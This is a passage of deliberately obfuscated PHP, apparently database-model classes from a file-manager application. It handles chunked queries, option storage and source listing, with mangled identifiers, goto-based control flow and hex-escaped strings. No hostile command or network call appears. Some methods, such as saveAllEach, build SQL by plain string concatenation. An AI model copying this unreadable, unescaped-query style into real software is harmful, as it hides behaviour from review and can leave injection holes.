"\40\127\x48\x45\x4e\40\47{$e›†ÌíÆ[1]}\x27\40\x54\x48\x45\x4e\x20\x27{$e›†ÌíÆ[3]}\x27\x20\xa"; if ($cÍÁŒö¬‡ == $d’˜ß¾±çñ || $b‰¢àïÖŠ == $Eèá“£éÆ· - 1) { goto f¨œ›‰ÊÑ–; D’½Üê·˜Æ: $dƒÜÂÇÊÅÌ = array(); goto E•…­¨«; aŒŸ™ï¸Ùø: $cÍÁŒö¬‡ = 0; $Aïº¿¸ƒ¸ = $c”“°èå‰Î; $this->chunkEventCheck(count($dƒÜÂÇÊÅÌ)); goto D’½Üê·˜Æ; f¨œ›‰ÊÑ–: $B–áëÑÒŠº = implode($CİŒÆµ¶ÓÂ[47], $dƒÜÂÇÊÅÌ); $Aïº¿¸ƒ¸ .= "\x20\x45\116\x44\40\x20\127\110\105\x52\x45\x20{$e›†ÌíÆ[0]}\40\111\x4e\40\50{$B–áëÑÒŠº}\x29\40"; $this->execute($Aïº¿¸ƒ¸); goto aŒŸ™ï¸Ùø; E•…­¨«: } } goto aÒ»£Š¼—“; føìÏ©Ôè×: } public function saveAllEach($cª ×å¾å) { $a¤”ÌºØç =& $_SERVER[Ö‘Øù]; $b³¬Î‹Ö¯ = $this->tablePrefix . $this->tableName; foreach ($cª ×å¾å as $e³ê÷éÀŠë) { if (!is_array($e³ê÷éÀŠë) || count($e³ê÷éÀŠë) != 4) { continue; } $D®Éñ¿¼ØÆ = $e³ê÷éÀŠë[0] . $a¤”ÌºØç[377] . $e³ê÷éÀŠë[1] . $a¤”ÌºØç[116]; $dÒë„¾— = $e³ê÷éÀŠë[2] . $a¤”ÌºØç[377] . $e³ê÷éÀŠë[3] . $a¤”ÌºØç[116]; $Cöƒã† ÖØ = "\165\x70\x64\141\164\145\x20{$b³¬Î‹Ö¯}\40\163\145\164\40{$dÒë„¾—}\x20\x77\x68\145\162\145\x20{$D®Éñ¿¼ØÆ}\x3b"; $this->execute($Cöƒã† ÖØ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($a‚¢ï–¦‡ = false, $BéŠòõ‰Ê = false) { $this->_chunkEvent = $a‚¢ï–¦‡; $this->_chunkEventParam = $BéŠòõ‰Ê; } private function chunkEventCheck($a…–³èã­) { if (!$this->_chunkEvent) { return; } $b¿•ƒ£ê¼° = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $b¿•ƒ£ê¼°[$_SERVER[Ö‘Øù][378]] = $a…–³èã­; Hook::trigger($this->_chunkEvent, $b¿•ƒ£ê¼°); } public function addAll($D¬‰ Œñ¥°, $C÷Ñµ°‘Û½ = array(), $CŒºà©ó = false) { goto B…Ãß‘ØÆ¾; BÊ¡…ò¦Ì‡: if (method_exists($this->db, $Bì¥š©§Œ…[270])) { for ($cŒæ—èõë = 0; $cŒæ—èõë < count($D¬‰ Œñ¥°); $cŒæ—èõë += $bß‘…¡™áß) { $dÖÔĞ¼è›´ = array_slice($D¬‰ Œñ¥°, $cŒæ—èõë, $bß‘…¡™áß); if (!is_array($dÖÔĞ¼è›´) || count($dÖÔĞ¼è›´) == 0) { break; } $díÉì‚¤áÒ = $this->db->insertAll($dÖÔĞ¼è›´, $C÷Ñµ°‘Û½, $CŒºà©ó); $this->chunkEventCheck(count($dÖÔĞ¼è›´)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($D¬‰ Œñ¥° as $cõÆƒƒ¡ => $dªê‡áá¡ß) { $díÉì‚¤áÒ = $this->db->insert($dªê‡áá¡ß, $C÷Ñµ°‘Û½, $CŒºà©ó); } $this->commit(); } if (!1 !== $díÉì‚¤áÒ) { $cœ´ßŒ•¸¯ = $this->getLastInsID(); if ($cœ´ßŒ•¸¯) { return $cœ´ßŒ•¸¯; } } return $díÉì‚¤áÒ; goto eëÑ™Ä´Úó; b¢ÊÒ‚“ó: if (empty($D¬‰ Œñ¥°)) { $this->error = think_lang($Bì¥š©§Œ…[269]); return !1; } $C÷Ñµ°‘Û½ = $this->_parseOptions($C÷Ñµ°‘Û½); foreach ($D¬‰ Œñ¥° as $cõÆƒƒ¡ => $dªê‡áá¡ß) { $D¬‰ Œñ¥°[$cõÆƒƒ¡] = $this->_facade($dªê‡áá¡ß); $this->_beforeInsert($D¬‰ Œñ¥°[$cõÆƒƒ¡], $C÷Ñµ°‘Û½); } goto BÊ¡…ò¦Ì‡; B…Ãß‘ØÆ¾: $Bì¥š©§Œ… =& $_SERVER[Ö‘Øù]; ignore_timeout(); $bß‘…¡™áß = self::SQL_WHERE_IN_CHUNK; goto b¢ÊÒ‚“ó; eëÑ™Ä´Úó: } public function save($Cš³…õ¾ = '', $Bå•¡®««± = array()) { goto bÓ‚¤´«æ±; a È‹†Å–ï: $D©§¹Üçöù = $a”ğÉ¿ïÚ³[$D×´ƒî‘ô[273]][$a±Ä¶§é…][1]; $D©§¹Üçöù = is_array($D©§¹Üçöù) ? $D©§¹Üçöù : array(); $aõÄÊ»–°¥ = count($D©§¹Üçöù); goto A¯Ä‹ÀŒ†¦; A¯Ä‹ÀŒ†¦: for ($AßÒÅ­ö¶ = 0; $AßÒÅ­ö¶ < $aõÄÊ»–°¥; $AßÒÅ­ö¶ += $bƒ‹îöø¦¹) { $a‚å±µÍ = array_slice($D©§¹Üçöù, $AßÒÅ­ö¶, $bƒ‹îöø¦¹); if (!is_array($a‚å±µÍ) || count($a‚å±µÍ) == 0) { break; } $a”ğÉ¿ïÚ³[$D×´ƒî‘ô[273]][$a±Ä¶§é…][1] = $a‚å±µÍ; $this->optionsValue($a”ğÉ¿ïÚ³); $e¼‘½¯Âµ½ += parent::save($Cš³…õ¾, $Bå•¡®««±); $this->chunkEventCheck(count($a‚å±µÍ)); } $this->chunkEventSet(); return $e¼‘½¯Âµ½; goto d–«ø£‰Ä²; c¿äâ²Ç: $a±Ä¶§é… = $this->findWhereField($a”ğÉ¿ïÚ³); if (!$a±Ä¶§é…) { return parent::save($Cš³…õ¾, $Bå•¡®««±); } $e¼‘½¯Âµ½ = 0; goto a È‹†Å–ï; bÓ‚¤´«æ±: $D×´ƒî‘ô =& $_SERVER[Ö‘Øù]; $bƒ‹îöø¦¹ = self::SQL_WHERE_IN_CHUNK; $a”ğÉ¿ïÚ³ = $this->optionsValue(); goto c¿äâ²Ç; d–«ø£‰Ä²: } public function add($E¶ùé¤éä  = '', $C¥Ê¼é¯ğ“ = array(), $BİÏ‡Ó¢í’ = false) { if ($this->addTaskStatus && is_array($E¶ùé¤éä )) { $this->addTaskData[] = $E¶ùé¤éä ; return; } return parent::add($E¶ùé¤éä , $C¥Ê¼é¯ğ“, $BİÏ‡Ó¢í’); } public function parseWhereLike($eìÎÛ‘©í, $cÜ‹Î×Şó = '', $d¨Š¼®œç = false, &$cŠÓÂÈíñ = false) { goto e¨”ŒË¶»; e¨”ŒË¶»: $FñäŸ½Œ¶‘ =& $_SERVER[Ö‘Øù]; $a¼Òğ¡£¤ = $GLOBALS[$FñäŸ½Œ¶‘[6]][$FñäŸ½Œ¶‘[379]]; if (!$a¼Òğ¡£¤[$FñäŸ½Œ¶‘[380]]) { return $eìÎÛ‘©í; } goto E»¼ŸåÍÎó; E»¼ŸåÍÎó: if (!is_array($eìÎÛ‘©í)) { return $eìÎÛ‘©í; } $D™¦Ì«…‘³ = array(); $E°ÍŸ…¦¾ = 0; goto A¾”ÑàÉæÑ; A¾”ÑàÉæÑ: foreach ($eìÎÛ‘©í as $F†·÷¸ğˆã => $b‘ÀùœêìÛ) { if (is_array($b‘ÀùœêìÛ) && count($b‘ÀùœêìÛ) == 2 && $b‘ÀùœêìÛ[0] == $FñäŸ½Œ¶‘[381] && is_string($b‘ÀùœêìÛ[1]) && substr($b‘ÀùœêìÛ[1], 0, 1) == $FñäŸ½Œ¶‘[382] && substr($b‘ÀùœêìÛ[1], strlen($b‘ÀùœêìÛ[1]) - 1, 1) == $FñäŸ½Œ¶‘[382]) { goto d­œè¬…‚; AÎ øÊ£–Ê: if ($a¼Òğ¡£¤[$FñäŸ½Œ¶‘[384]]) { $A±–Š£Ñ’¹ = $FñäŸ½Œ¶‘[385] . $EŸ©óÁÚ…í . $FñäŸ½Œ¶‘[386]; if ($a¼Òğ¡£¤[$FñäŸ½Œ¶‘[387]]) { $A±–Š£Ñ’¹ = $FñäŸ½Œ¶‘[386] . $EŸ©óÁÚ…í . $FñäŸ½Œ¶‘[385]; } } $D™¦Ì«…‘³[$E°ÍŸ…¦¾] = $FñäŸ½Œ¶‘[388] . $AÛÔƒ–ÒŞ . $FñäŸ½Œ¶‘[389] . $A±–Š£Ñ’¹ . $FñäŸ½Œ¶‘[390]; $E°ÍŸ…¦¾++; goto CÁ•Ææ‡Û; d­œè¬…‚: $cŠÓÂÈíñ = !0; $AÛÔƒ–ÒŞ = is_string($F†·÷¸ğˆã) ? $F†·÷¸ğˆã : $cÜ‹Î×Şó; $EŸ©óÁÚ…í = substr($b‘ÀùœêìÛ[1], 1, strlen($b‘ÀùœêìÛ[1]) - 2); goto A™‰‰ßˆ‘¦; CÁ•Ææ‡Û: continue; goto FŸ”«Úó¼‡; A™‰‰ßˆ‘¦: $EŸ©óÁÚ…í = $this->db->escapeString($EŸ©óÁÚ…í); if (!strpos($AÛÔƒ–ÒŞ, $FñäŸ½Œ¶‘[95])) { $AÛÔƒ–ÒŞ = $FñäŸ½Œ¶‘[383] . $AÛÔƒ–ÒŞ . $FñäŸ½Œ¶‘[383]; } $A±–Š£Ñ’¹ = $FñäŸ½Œ¶‘[182] . $EŸ©óÁÚ…í . $FñäŸ½Œ¶‘[182]; goto AÎ øÊ£–Ê; FŸ”«Úó¼‡: } if (is_array($b‘ÀùœêìÛ)) { $cÜ‹Î×Şó = is_string($F†·÷¸ğˆã) ? $F†·÷¸ğˆã : $cÜ‹Î×Şó; $b‘ÀùœêìÛ = $this->parseWhereLike($b‘ÀùœêìÛ, $cÜ‹Î×Şó, !0, $cŠÓÂÈíñ); } if (is_numeric($F†·÷¸ğˆã)) { $D™¦Ì«…‘³[$E°ÍŸ…¦¾] = $b‘ÀùœêìÛ; $E°ÍŸ…¦¾++; } else { $D™¦Ì«…‘³[$F†·÷¸ğˆã] = $b‘ÀùœêìÛ; } } if ($cŠÓÂÈíñ && !$d¨Š¼®œç) { } return $D™¦Ì«…‘³; goto b‰´¿¹Èä†; b‰´¿¹Èä†: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Añºù¸‚ = array()) { goto DÄóÉ›ğÊ­; DÄóÉ›ğÊ­: $CƒŠœâ·¸‰ =& $_SERVER[Ö‘Øù]; $c’ôÈ‘èëÀ = self::SQL_WHERE_IN_CHUNK; $a¥…£ã˜˜ö = $this->optionsValue(); goto d‡ÜÃñÂƒ; BôÕ¸œÛÈœ: return $AÃ«áó¥á; goto Fğ·µàÑ–°; a¸Ç·»ğº—: $eÌï¯â¬µ‹ = is_array($eÌï¯â¬µ‹) ? $eÌï¯â¬µ‹ : array(); $AÃ«áó¥á = null; for ($A¶ôÉÕÖâ = 0; $A¶ôÉÕÖâ < count($eÌï¯â¬µ‹); $A¶ôÉÕÖâ += $c’ôÈ‘èëÀ) { $CÎÔçŸÆ“† = array_slice($eÌï¯â¬µ‹, $A¶ôÉÕÖâ, $c’ôÈ‘èëÀ); if (!is_array($CÎÔçŸÆ“†) || count($CÎÔçŸÆ“†) == 0) { break; } $a¥…£ã˜˜ö[$CƒŠœâ·¸‰[273]][$Bí¸š¡àØ][1] = $CÎÔçŸÆ“†; $this->optionsValue($a¥…£ã˜˜ö); $Dßµ‡ÎË¼ = parent::select($Añºù¸‚); if (!$Dßµ‡ÎË¼) { continue; } $AÃ«áó¥á = is_array($AÃ«áó¥á) ? $AÃ«áó¥á : array(); $AÃ«áó¥á = array_merge($AÃ«áó¥á, $Dßµ‡ÎË¼); } goto BôÕ¸œÛÈœ; d‡ÜÃñÂƒ: $Bí¸š¡àØ = $this->findWhereField($a¥…£ã˜˜ö); if (!$Bí¸š¡àØ || isset($a¥…£ã˜˜ö[$CƒŠœâ·¸‰[290]]) || isset($a¥…£ã˜˜ö[$CƒŠœâ·¸‰[351]])) { return parent::select($Añºù¸‚); } $eÌï¯â¬µ‹ = $a¥…£ã˜˜ö[$CƒŠœâ·¸‰[273]][$Bí¸š¡àØ][1]; goto a¸Ç·»ğº—; Fğ·µàÑ–°: } public function delete($bø°ëæèöô = array()) { goto f¨Æ†Ò£Ÿå; a¶ŠÚ¸‘­‰: return $EùŞ„òˆ‘; goto d“ê–Ş«‚‘; f¨Æ†Ò£Ÿå: $Bò÷½¨“®ß =& $_SERVER[Ö‘Øù]; $B³Ù“·õ‡‘ = self::SQL_WHERE_IN_CHUNK; $EÙÚ¸Ê‚ìù = $this->optionsValue(); goto d‚„›øÖ±¤; d‚„›øÖ±¤: $fŠ¯²èÆ™â = $this->findWhereField($EÙÚ¸Ê‚ìù); if (!$fŠ¯²èÆ™â) { return parent::delete($bø°ëæèöô); } $EùŞ„òˆ‘ = 0; goto C¶« åùÌå; C¶« åùÌå: $F”‘‡ÂÑ¬ = $EÙÚ¸Ê‚ìù[$Bò÷½¨“®ß[273]][$fŠ¯²èÆ™â][1]; $F”‘‡ÂÑ¬ = is_array($F”‘‡ÂÑ¬) ? $F”‘‡ÂÑ¬ : array(); for ($d×„·«Áòê = 0; $d×„·«Áòê < count($F”‘‡ÂÑ¬); $d×„·«Áòê += $B³Ù“·õ‡‘) { $F‘ËœŒ¨ç = array_slice($F”‘‡ÂÑ¬, $d×„·«Áòê, $B³Ù“·õ‡‘); if (!is_array($F‘ËœŒ¨ç) || count($F‘ËœŒ¨ç) == 0) { break; } $EÙÚ¸Ê‚ìù[$Bò÷½¨“®ß[273]][$fŠ¯²èÆ™â][1] = $F‘ËœŒ¨ç; $this->optionsValue($EÙÚ¸Ê‚ìù); $EùŞ„òˆ‘ += parent::delete($bø°ëæèöô); } goto a¶ŠÚ¸‘­‰; d“ê–Ş«‚‘: } private function findWhereField($C…×ø˜‰ªÂ) { $FÔåÓ–§Ôò =& $_SERVER[Ö‘Øù]; $a•àßõŠòµ = self::SQL_WHERE_IN_CHUNK; if (!is_array($C…×ø˜‰ªÂ) || !is_array($C…×ø˜‰ªÂ[$FÔåÓ–§Ôò[273]])) { return !1; } foreach ($C…×ø˜‰ªÂ[$FÔåÓ–§Ôò[273]] as $D¨¯ó¯¸ÉÁ => $dÒ°íæÌĞ) { if (is_array($dÒ°íæÌĞ) && isset($dÒ°íæÌĞ[0]) && is_string($dÒ°íæÌĞ[0]) && strtolower($dÒ°íæÌĞ[0]) == $FÔåÓ–§Ôò[7] && is_array($dÒ°íæÌĞ[1]) && count($dÒ°íæÌĞ[1]) > $a•àßõŠòµ) { ignore_timeout(); return $D¨¯ó¯¸ÉÁ; } } return !1; } public function setMasterDB($A¢íŞÂÎå‡ = true) { think_config($_SERVER[Ö‘Øù][391], $A¢íŞÂÎå‡); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\x65\155\117\160\x74\x69\157\156"; public $field = array(); public function listData($F¿ˆŠŸÀ×ç = false, $Bº­¥Üé™‡ = "\x6d\157\x64\x69\146\x79\x54\151\155\145", $DÀóñ¯ƒğ¨ = false) { $cĞ†Ÿù¦õ = Model($this->modelType)->get(!1, $this->optionType, !0); $bÇ‹Î¥×Ö¾ = array_values($cĞ†Ÿù¦õ); if ($bÇ‹Î¥×Ö¾ && $bÇ‹Î¥×Ö¾[0] && !is_array($bÇ‹Î¥×Ö¾[0])) { Model($this->modelType)->cacheRemove($this->optionType); $cĞ†Ÿù¦õ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$cĞ†Ÿù¦õ) { return $F¿ˆŠŸÀ×ç ? null : array(); } if (!$F¿ˆŠŸÀ×ç) { $cĞ†Ÿù¦õ = array_filter(array_values($cĞ†Ÿù¦õ)); return array_sort_by($cĞ†Ÿù¦õ, $Bº­¥Üé™‡, $DÀóñ¯ƒğ¨); } return $cĞ†Ÿù¦õ[$_SERVER[Ö‘Øù][392] . $F¿ˆŠŸÀ×ç]; } public function insert($a°ñôŒµ ) { goto AöÜíÈ—; DÜ»ŞµÂ´: return $Aˆ¢‹İ¬Üœ; goto BˆšŒÔ­Ø; d’‘ß¨ƒÒ: $a°ñôŒµ [$b‘™«Úå¾[84]] = time(); Model($this->modelType)->set($b‘™«Úå¾[393], $Aˆ¢‹İ¬Üœ, $this->optionType . $b‘™«Úå¾[394]); Model($this->modelType)->set($b‘™«Úå¾[392] . $Aˆ¢‹İ¬Üœ, $a°ñôŒµ , $this->optionType); goto DÜ»ŞµÂ´; Dæî½‚ŞƒŞ: $Aˆ¢‹İ¬Üœ = $Aˆ¢‹İ¬Üœ ? $Aˆ¢‹İ¬Üœ : 0; $a°ñôŒµ [$b‘™«Úå¾[395]] = ++$Aˆ¢‹İ¬Üœ; $a°ñôŒµ [$b‘™«Úå¾[194]] = time(); goto d’‘ß¨ƒÒ; AöÜíÈ—: $b‘™«Úå¾ =& $_SERVER[Ö‘Øù]; $a°ñôŒµ  = array_field_key($a°ñôŒµ , $this->field); $Aˆ¢‹İ¬Üœ = Model($this->modelType)->get($b‘™«Úå¾[393], $this->optionType . $b‘™«Úå¾[394]); goto Dæî½‚ŞƒŞ; BˆšŒÔ­Ø: } public function update($BŒğùÏ¸ØĞ, $BàäëšÏæ«) { goto FÈ÷ŒĞŒĞÛ; FÈ÷ŒĞŒĞÛ: $f‚°ÌÕåé =& $_SERVER[Ö‘Øù]; $BàäëšÏæ« = array_field_key($BàäëšÏæ«, $this->field); $c­÷òÍâÚ§ = $this->listData($BŒğùÏ¸ØĞ); goto a‡¶á‡œİ‡; a‡¶á‡œİ‡: if (!$c­÷òÍâÚ§ || !$BŒğùÏ¸ØĞ) { return !1; } $BàäëšÏæ« = array_merge($c­÷òÍâÚ§, $BàäëšÏæ«); $BàäëšÏæ«[$f‚°ÌÕåé[84]] = time(); goto CÆÁé³ŠÆ; CÆÁé³ŠÆ: return Model($this->modelType)->set($f‚°ÌÕåé[392] . $BŒğùÏ¸ØĞ, $BàäëšÏæ«, $this->optionType); goto B•¥©•¬æø; B•¥©•¬æø: } public function remove($fˆ¹¨Ñ¯§ã) { if (!$fˆ¹¨Ñ¯§ã) { return !1; } return Model($this->modelType)->remove($_SERVER[Ö‘Øù][392] . $fˆ¹¨Ñ¯§ã, $this->optionType); } public function clear() { $C„Ñ¶ÚÂÏİ =& $_SERVER[Ö‘Øù]; Model($this->modelType)->remove($C„Ñ¶ÚÂÏİ[393], $this->optionType . $C„Ñ¶ÚÂÏİ[394]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($dİÌ’é¦°Ë, $E‹Ïš“êÃ) { if (!$E‹Ïš“êÃ) { return !1; } $fìˆÂ§¬Ìî = $this->listData(); $fìˆÂ§¬Ìî = array_to_keyvalue($fìˆÂ§¬Ìî, $dİÌ’é¦°Ë); return isset($fìˆÂ§¬Ìî[$E‹Ïš“êÃ]) ? $fìˆÂ§¬Ìî[$E‹Ïš“êÃ] : !1; } public function findByName($Cä¬¯„ÆÑŞ) { return $this->findByKey($_SERVER[Ö‘Øù][28], $Cä¬¯„ÆÑŞ); } protected function resetData($BÕˆŒÎèé) { $CË·Á‹ºŠ =& $_SERVER[Ö‘Øù]; $BÕˆŒÎèé = is_array($BÕˆŒÎèé) ? $BÕˆŒÎèé : array(); $Dˆ¨½·å = array(); for ($BßØ’‘»š = 0; $BßØ’‘»š < count($BÕˆŒÎèé); $BßØ’‘»š++) { $Dˆ¨½·å[$CË·Á‹ºŠ[392] . $BÕˆŒÎèé[$BßØ’‘»š][$CË·Á‹ºŠ[395]]] = $BÕˆŒÎèé[$BßØ’‘»š]; } return Model($this->modelType)->set($Dˆ¨½·å, !1, $this->optionType); } private function getAutoName($AİŒ†¡õ¤¯) { $b¬ö‘¼µØ = array_to_keyvalue($this->listData(), $_SERVER[Ö‘Øù][28]); if (!$b¬ö‘¼µØ || !isset($b¬ö‘¼µØ[$AİŒ†¡õ¤¯])) { return $AİŒ†¡õ¤¯; } for ($bªÖ‘Ä˜Œï = 1; $bªÖ‘Ä˜Œï < count($b¬ö‘¼µØ); $bªÖ‘Ä˜Œï++) { $Cİ×¯…¸×Ö = $AİŒ†¡õ¤¯ . "\x28{$bªÖ‘Ä˜Œï}\x29"; if (!isset($b¬ö‘¼µØ[$Cİ×¯…¸×Ö])) { return $Cİ×¯…¸×Ö; } } return $Cİ×¯…¸×Ö; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($cÌªùÀŠâ = false, $c£×İÚŠœ = '', $dâ£‹·Ìï = false) { goto EêíîÁ°¾ß; f„À‰µø„‰: $this->cacheSet($c£×İÚŠœ, $b§Û’¡•°º); $b§Û’¡•°º = array_merge($EœÏ¶é¨à, $b§Û’¡•°º); return $cÌªùÀŠâ ? $b§Û’¡•°º[$cÌªùÀŠâ] : $b§Û’¡•°º; goto fÕäç‚´÷Í; b±”£´†¾Œ: $EœÏ¶é¨à = is_array($EœÏ¶é¨à) ? $EœÏ¶é¨à : array(); if (is_array($b§Û’¡•°º)) { $b§Û’¡•°º = array_merge($EœÏ¶é¨à, $b§Û’¡•°º); return $cÌªùÀŠâ ? isset($b§Û’¡•°º[$cÌªùÀŠâ]) ? $b§Û’¡•°º[$cÌªùÀŠâ] : null : $b§Û’¡•°º; } $dœí¡¹Ğ = $this->filterWhere(array($d˜Ï½¶Ä«[29] => $c£×İÚŠœ)); goto cĞéƒ–ò›ö; EêíîÁ°¾ß: $d˜Ï½¶Ä« =& $_SERVER[Ö‘Øù]; $b§Û’¡•°º = $this->cacheGet($c£×İÚŠœ); $EœÏ¶é¨à = $this->optionDefault($c£×İÚŠœ); goto b±”£´†¾Œ; cĞéƒ–ò›ö: $b§Û’¡•°º = $this->where($dœí¡¹Ğ)->select(); $b§Û’¡•°º = array_to_keyvalue($b§Û’¡•°º, $d˜Ï½¶Ä«[93], $d˜Ï½¶Ä«[372]); foreach ($b§Û’¡•°º as $fïáñ™‹Äø => $b«éìŠ®º) { if ($dâ£‹·Ìï || in_array($fïáñ™‹Äø, $this->jsonField)) { $b§Û’¡•°º[$fïáñ™‹Äø] = json_decode($b«éìŠ®º, !0); } } goto f„À‰µø„‰; fÕäç‚´÷Í: } public function set($c³Š…ˆ×‰™, $CôÀôˆÏİŒ = false, $bá§©¸Š“Ñ = '') { goto FÊÎìÆ“éƒ; E¨æÇƒç×: $d—ÜóˆÎí† = is_array($c³Š…ˆ×‰™) ? $c³Š…ˆ×‰™ : array($c³Š…ˆ×‰™ => $CôÀôˆÏİŒ); foreach ($d—ÜóˆÎí† as $eÀ‚“·‰º => $Bò¢”§ÏÀ) { if (is_array($Bò¢”§ÏÀ)) { $Bò¢”§ÏÀ = json_encode_force($Bò¢”§ÏÀ); } $this->checkLength($Bò¢”§ÏÀ, !1, $this->tableName . $D¹Ôœ·é¿¢[4] . $c³Š…ˆ×‰™); $Bò¢”§ÏÀ = self::textEncode($Bò¢”§ÏÀ); $d—ÜóˆÎí† = array($D¹Ôœ·é¿¢[29] => $bá§©¸Š“Ñ, $D¹Ôœ·é¿¢[93] => $eÀ‚“·‰º, $D¹Ôœ·é¿¢[372] => $Bò¢”§ÏÀ); $cÇ±Ô¾à[] = $this->filterWhere($d—ÜóˆÎí†); } if (!$cÇ±Ô¾à) { return !0; } goto F…ø÷ğó; F…ø÷ğó: return $this->addAll($cÇ±Ô¾à, array(), !0); goto fÎÜ½ƒõá; FÊÎìÆ“éƒ: $D¹Ôœ·é¿¢ =& $_SERVER[Ö‘Øù]; $this->cacheRemove($bá§©¸Š“Ñ); $cÇ±Ô¾à = array(); goto E¨æÇƒç×; fÎÜ½ƒõá: } protected function optionDefault($D¼ÀÜÅÑ•´ = '') { return !1; } public function setDeep($E¨ÛÛ°Ã£, $A¡£¯ÏÎğ  = false, $a†ßÔåÅî± = '') { $A©Ê²§»ÑÏ = explode($_SERVER[Ö‘Øù][95], $E¨ÛÛ°Ã£); $Bİ¼í¨ÖÃÉ = $this->get(); array_set_value($Bİ¼í¨ÖÃÉ, $E¨ÛÛ°Ã£, $A¡£¯ÏÎğ ); $this->set($A©Ê²§»ÑÏ[0], $Bİ¼í¨ÖÃÉ[$A©Ê²§»ÑÏ[0]], $a†ßÔåÅî±); } public function remove($bîÖ·ˆ’Œ, $EÀ¨–š«°É = '') { $cñØô¨ã =& $_SERVER[Ö‘Øù]; $this->cacheRemove($EÀ¨–š«°É); $FÃ±Ó¹Şò¤ = $this->filterWhere(array($cñØô¨ã[93] => $bîÖ·ˆ’Œ, $cñØô¨ã[29] => $EÀ¨–š«°É)); if (is_null($bîÖ·ˆ’Œ)) { unset($FÃ±Ó¹Şò¤[$cñØô¨ã[93]]); } return $this->where($FÃ±Ó¹Şò¤)->delete(); } public function cacheSet($Dïå´šõÂÆ, $A³®¶âŞ¦ = false) { return Cache::set($this->cacheKey($Dïå´šõÂÆ), $A³®¶âŞ¦); } public function cacheGet($B¾—á˜½„) { return Cache::get($this->cacheKey($B¾—á˜½„)); } public function cacheRemove($Ašè‚ß¹òÜ) { return Cache::remove($this->cacheKey($Ašè‚ß¹òÜ)); } protected function filterWhere($Dµ¤±‹ÁîÉ) { return $Dµ¤±‹ÁîÉ; } protected function cacheKey($A¹ÎÍé÷ŒÃ) { return $A¹ÎÍé÷ŒÃ; } } goto fÃƒà“¤àß; fÃƒà“¤àß: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\143\x65"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\x6d\145" => "\151\157\x5f\x73\x6f\165\162\143\145\x5f\x6d\145\x74\141", "\x6d\145\164\x61\x46\x69\145\x6c\144" => "\x73\157\165\x72\143\x65\x49\104"); protected $dataAuto = array(array("\155\157\x64\x69\146\171\x54\x69\155\145", "\164\x69\155\145", "\x69\x6e\163\145\162\x74", "\146\165\x6e\143\164\x69\157\156"), array("\143\162\x65\x61\x74\x65\x54\x69\x6d\145", "\164\x69\155\145", "\x69\156\163\145\x72\x74", "\x66\165\156\143\x74\x69\157\x6e"), array("\x76\x69\145\x77\x54\x69\155\145", "\x74\151\155\145", "\151\x6e\x73\x65\x72\164", "\x66\165\x6e\x63\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($aŒŸÒíø¨) { return $this->listSource(array($_SERVER[Ö‘Øù][396] => $aŒŸÒíø¨)); } public function typeName($c«”´¢Àšà) { static $B’¦÷† ò = array(self::TYPE_SYSTEM => "\163\x79\163\x74\145\x6d", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\147\162\x6f\x75\160"); return $B’¦÷† ò[$c«”´¢Àšà . $_SERVER[Ö‘Øù][33]]; } public function sourceListInfo($B‚±¾¢Ü¼Å, $fä‚ƒÏŞ„ = false) { goto cßºÈ¢¦ô; FŠÊÖØ¥ö…: if (!$B‚±¾¢Ü¼Å) { return array(); } $BÏÆç‡„ù = $this->where(array($cœæíÅ¦Ğ›[397] => array($cœæíÅ¦Ğ›[7], $B‚±¾¢Ü¼Å)))->select(); $this->_listDataApply($BÏÆç‡„ù, $fä‚ƒÏŞ„); goto aŒõ‘ç»ôÔ; aŒõ‘ç»ôÔ: return array_to_keyvalue($BÏÆç‡„ù, $cœæíÅ¦Ğ›[397]); goto b¸ğ™œ¼Ç; cßºÈ¢¦ô: $cœæíÅ¦Ğ› =& $_SERVER[Ö‘Øù]; $B‚±¾¢Ü¼Å = $B‚±¾¢Ü¼Å ? $B‚±¾¢Ü¼Å : array(); $B‚±¾¢Ü¼Å = array_filter(array_unique($B‚±¾¢Ü¼Å)); goto FŠÊÖØ¥ö…; b¸ğ™œ¼Ç: } public function pathInfoFilter(&$DÅÅİñ¨Ì•) { goto Bâ¸¬¹´È; EïºÉ¡Î¥™: static $B™¸‘³  = false; if (!$dÀ¤£Ú) { goto B¢½ôè‰÷; cÍÍ¢Ûæ„ª: $dçªØÚãÑ = array(); foreach ($dÀ¤£Ú as $d—Êâµï¾) { if (in_array($d—Êâµï¾, $aÕÏŒ¡æøñ)) { continue; } $dçªØÚãÑ[] = $d—Êâµï¾; } $B™¸‘³  = explode($BØÌ‚÷¥[47], $BØÌ‚÷¥[402]); goto a˜óó—•’’; B¢½ôè‰÷: $eº—ôñ²¸Ü = $BØÌ‚÷¥[398]; $eº—ôñ²¸Ü .= $BØÌ‚÷¥[399]; $eº—ôñ²¸Ü .= $BØÌ‚÷¥[400]; goto b§ò¤¥™¸¬; b§ò¤¥™¸¬: $Ağ‘Õºƒóì = $BØÌ‚÷¥[401]; $aÕÏŒ¡æøñ = explode($BØÌ‚÷¥[47], $Ağ‘Õºƒóì); $dÀ¤£Ú = explode($BØÌ‚÷¥[47], $eº—ôñ²¸Ü); goto cÍÍ¢Ûæ„ª; a˜óó—•’’: } foreach ($B™¸‘³  as $c½Ç••£—ô) { if (isset($DÅÅİñ¨Ì•[$c½Ç••£—ô])) { $DÅÅİñ¨Ì•[$c½Ç••£—ô] = intval($DÅÅİñ¨Ì•[$c½Ç••£—ô]); } } goto e‡¨ßİôÕ; Bâ¸¬¹´È: $BØÌ‚÷¥ =& $_SERVER[Ö‘Øù]; static $dÀ¤£Ú = false; static 